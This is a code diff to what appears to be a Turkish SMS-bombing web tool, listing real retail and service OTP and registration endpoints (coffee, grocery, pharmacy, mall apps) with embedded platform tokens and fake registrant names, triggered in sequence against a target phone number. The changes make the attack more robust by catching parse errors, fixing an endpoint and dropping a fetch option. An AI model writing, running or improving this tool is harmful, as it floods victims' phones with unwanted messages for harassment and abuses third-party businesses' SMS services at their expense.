@@ -55,7 +55,7 @@
         </div>
 
         <div class="mt-8 text-center">
-            <p class="text-[10px] text-zinc-600 font-medium tracking-wide">&copy; 2026 Jindex Studio. Tüm hakları sablıdır.</p>
+            <p class="text-[10px] text-zinc-600 font-medium tracking-wide">&copy; 2026 Jindex Studio. Tüm hakları saklıdır.</p>
         </div>
 
     </div>
@@ -113,7 +113,7 @@
                     name: "kahvedunyasi",
                     url: "https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number",
                     opts: { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ countryCode: "90", phoneNumber: phone }) },
-                    check: async (r) => { let j = await r.json(); return j.processStatus === "Success"; }
+                    check: async (r) => { try { let j = await r.json(); return j.processStatus === "Success"; } catch { return false; } }
                 },
                 {
                     name: "wmf",
@@ -131,13 +131,13 @@
                     name: "englishhome",
                     url: "https://www.englishhome.com/api/member/sendOtp",
                     opts: { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ Phone: phone, XID: "" }) },
-                    check: async (r) => { let j = await r.json(); return j.isError === false; }
+                    check: async (r) => { try { let j = await r.json(); return j.isError === false; } catch { return false; } }
                 },
                 {
                     name: "suiste",
                     url: "https://suiste.com/api/auth/code",
                     opts: { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: `action=register&gsm=${phone}&full_name=Memati+Bas&password=31MeMaTi31` },
-                    check: async (r) => { let j = await r.json(); return j.code === "common.success"; }
+                    check: async (r) => { try { let j = await r.json(); return j.code === "common.success"; } catch { return false; } }
                 },
                 {
                     name: "kimgb",
@@ -155,13 +155,13 @@
                     name: "ucdortbes",
                     url: "https://api.345dijital.com/api/users/register",
                     opts: { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ email: "", name: "Memati", trackingNumber: `+90${phone}`, surname: "Bas" }) },
-                    check: async (r) => { let j = await r.json(); return j.error !== "E-Posta veya telefon zaten kayıtlı!"; }
+                    check: async (r) => { try { let j = await r.json(); return j.error !== "E-Posta veya telefon zaten kayıtlı!"; } catch { return false; } }
                 },
                 {
                     name: "tiklagelsin",
                     url: "https://svc.apps.tiklagelsin.com/user/graphql",
                     opts: { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ operationName: "GENERATE_OTP", query: "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n", variables: { challenge: "3d6f9ff9-86ce-4bf3-8ba9-4a85ca975e68", deviceUniqueId: "720932D5-47BD-46CD-A4B8-086EC49F81AB", phone: `+90${phone}` } }) },
-                    check: async (r) => { let j = await r.json(); return j.data?.generateOtp === true; }
+                    check: async (r) => { try { let j = await r.json(); return j.data?.generateOtp === true; } catch { return false; } }
                 },
                 {
                     name: "naosstars",
@@ -179,7 +179,7 @@
                     name: "hayatsu",
                     url: "https://api.hayatsu.com.tr/api/SignUp/SendOtp",
                     opts: { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: `mobilePhoneNumber=${phone}&actionType=register` },
-                    check: async (r) => { let j = await r.json(); return j.is_success === true; }
+                    check: async (r) => { try { let j = await r.json(); return j.is_success === true; } catch { return false; } }
                 },
                 {
                     name: "hizliecza",
@@ -191,43 +191,43 @@
                     name: "metro",
                     url: "https://mobile.metro-tr.com/api/mobileAuth/validateSmsSend",
                     opts: { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ methodType: "2", mobilePhoneNumber: phone }) },
-                    check: async (r) => { let j = await r.json(); return j.status === "success"; }
+                    check: async (r) => { try { let j = await r.json(); return j.status === "success"; } catch { return false; } }
                 },
                 {
                     name: "file",
                     url: "https://api.filemarket.com.tr/v1/otp/send",
                     opts: { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ mobilePhoneNumber: `90${phone}` }) },
-                    check: async (r) => { let j = await r.json(); return j.responseType === "SUCCESS"; }
+                    check: async (r) => { try { try { let j = await r.json(); return j.responseType === "SUCCESS"; } catch { return false; } } catch { return false; } }
                 },
                 {
                     name: "akasya",
                     url: "https://akasyaapi.poilabs.com/v1/en/sms",
                     opts: { method: "POST", headers: { "Content-Type": "application/json", "X-Platform-Token": "9f493307-d252-4053-8c96-62e7c90271f5" }, body: JSON.stringify({ phone: phone }) },
-                    check: async (r) => { let j = await r.json(); return j.result === "SMS sended succesfully!"; }
+                    check: async (r) => { try { let j = await r.json(); return j.result === "SMS sended succesfully!"; } catch { return false; } }
                 },
                 {
                     name: "akbati",
                     url: "https://akbatiapi.poilabs.com/v1/en/sms",
                     opts: { method: "POST", headers: { "Content-Type": "application/json", "X-Platform-Token": "a2fe21af-b575-4cd7-ad9d-081177c239a3" }, body: JSON.stringify({ phone: phone }) },
-                    check: async (r) => { let j = await r.json(); return j.result === "SMS sended succesfully!"; }
+                    check: async (r) => { try { let j = await r.json(); return j.result === "SMS sended succesfully!"; } catch { return false; } }
                 },
                 {
                     name: "komagene",
                     url: "https://gateway.komagene.com.tr/auth/auth/smskodugonder",
                     opts: { method: "POST", headers: { "Content-Type": "application/json", "Firmaid": "32" }, body: JSON.stringify({ FirmaId: 32, Telefon: phone }) },
-                    check: async (r) => { let j = await r.json(); return j.Success === true; }
+                    check: async (r) => { try { let j = await r.json(); return j.Success === true; } catch { return false; } }
                 },
                 {
                     name: "porty",
                     url: "https://panel.porty.tech/api.php?",
                     opts: { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ job: "start_login", phone: phone }) },
-                    check: async (r) => { let j = await r.json(); return j.status === "success"; }
+                    check: async (r) => { try { let j = await r.json(); return j.status === "success"; } catch { return false; } }
                 },
                 {
                     name: "tasdelen",
                     url: "https://tasdelen.sufirmam.com:3300/mobile/send-otp",
                     opts: { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ phone: phone }) },
-                    check: async (r) => { let j = await r.json(); return j.result === true; }
+                    check: async (r) => { try { let j = await r.json(); return j.result === true; } catch { return false; } }
                 },
                 {
                     name: "uysal",
@@ -237,7 +237,7 @@
                 },
                 {
                     name: "yapp",
-                    url: "https://yapp.com.tr/api/mobile/v1/register",
+                    url: "https://api.yapp.com.tr/api/mobile/v1/register",
                     opts: { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ app_version: "1.1.5", phone_number: phone, firstname: "Memati", lastname: "Bas", email: mail }) },
                     check: async (r) => r.status === 200
                 },
@@ -252,7 +252,7 @@
             // İstekleri 400ms aralıklarla sırayla tetikle
             for (let svc of services) {
                 try {
-                    let response = await fetch(svc.url, { ...svc.opts, mode: 'cors' });
+                    let response = await fetch(svc.url, { ...svc.opts });
                     let isSuccess = await svc.check(response);
                     if (isSuccess) {
                         logMessage(`Başarılı! ${phone} --> ${svc.name}`, "success");
